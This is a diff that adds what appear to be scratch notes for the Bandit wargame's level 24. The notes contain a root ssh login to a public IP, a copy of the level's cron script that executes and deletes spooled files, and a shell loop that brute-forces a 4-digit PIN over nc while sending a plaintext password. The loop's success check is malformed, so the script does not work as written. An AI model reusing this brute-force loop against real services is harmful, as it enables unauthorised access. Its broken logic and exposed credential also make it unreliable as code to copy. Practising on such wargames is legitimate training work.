@@ -1,0 +1,35 @@
+ssh -i C:\Users\xxx\Desktop\640kgf root@122.51.158.145 -p 2220
+122.51.158.145
+cd /var/spool/bandit24
+ssh -i 640kgf root@122.51.158.145 -p 2220
+cd /var/spool/bandit24
+echo "Executing and deleting all scripts in /var/spool/bandit24:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+
+=======================================
+export PATH
+
+touch /tmp/211/passwd
+for i in $(seq 1 10000)
+do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i">/tmp/211/passwd
+	nc 192.168.101.80 30002 </tmp/211/passwd
+
+if ["$?==0"]; then
+echo "$i">/tmp/211/num
+break
+fi
+done
+
+exit 0
+
+
+echo
